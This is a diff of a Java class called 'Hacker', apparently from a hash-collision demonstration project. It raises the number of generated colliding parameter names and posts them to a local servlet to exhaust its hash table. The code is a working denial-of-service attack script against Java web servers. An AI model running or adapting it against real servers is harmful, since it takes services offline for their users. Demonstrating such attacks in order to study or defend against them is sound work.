@@ -22,20 +22,16 @@ public class Hacker {
     public static void main(String[] args) throws Exception {
         // will produce 4^stringlength collisons. so 10 will produce 1'048'576
         // collisions
-        int stringlength = 7;
+        int stringlength = 8;
         URL server = new URL(
                 "http://localhost:8080/HashCollisionWeb/HashCollisionServlet");
 
-        // generate the list of collisions first and do not send them
-        // immediately after producing them, it only takes about 2-3 seconds for
-        // a million but still…
+        // takes about 2-3 seconds for a million collisions
         List<String> collisions = generateCombinations(stringlength, basestring);
         HttpURLConnection conn = (HttpURLConnection) server.openConnection();
         conn.setDoOutput(true);
 
         String parameter = HashCollisionServlet.PARAM_NAME + "=fred&";
-        // conn.setRequestProperty("Content-Length",
-        // "" + Integer.toString(parameter.getBytes().length));
         conn.setUseCaches(false);
 
         OutputStreamWriter writer = new OutputStreamWriter(
@@ -45,20 +41,13 @@ public class Hacker {
             writer.write(s + "=1&");
         }
         writer.flush();
-        // System.out.println("after flush");
         writer.close();
-        // System.out.println("after close");
 
-        // this methodcall waits until the server has processed a part (dunno
-        // what exactly) of the request
         BufferedReader reader = new BufferedReader(new InputStreamReader(
                 conn.getInputStream()));
-        // System.out.println("after getting inputreader");
 
         reader.close();
-        // System.out.println("after reader close");
         conn.disconnect();
-        // System.out.println("after disconnect");
     }
 
     private static final List<String> generateCombinations(int arraySize,
